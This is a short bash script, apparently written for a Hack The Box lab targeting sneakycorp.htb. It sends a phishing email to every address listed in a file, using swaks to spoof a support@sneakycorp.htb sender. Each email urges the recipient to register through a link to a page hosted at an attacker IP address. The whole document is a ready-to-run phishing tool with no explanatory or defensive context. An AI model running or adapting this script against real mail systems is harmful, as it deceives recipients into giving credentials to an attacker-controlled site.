#!/bin/bash
for email in $(cat emails.txt)
do
	swaks \
		--from support@sneakycorp.htb \
		--to $email \
		--header 'Subject: Please Register Your Account' \
		--body 'http://10.10.14.11/register.php' \
		--server sneakycorp.htb
done
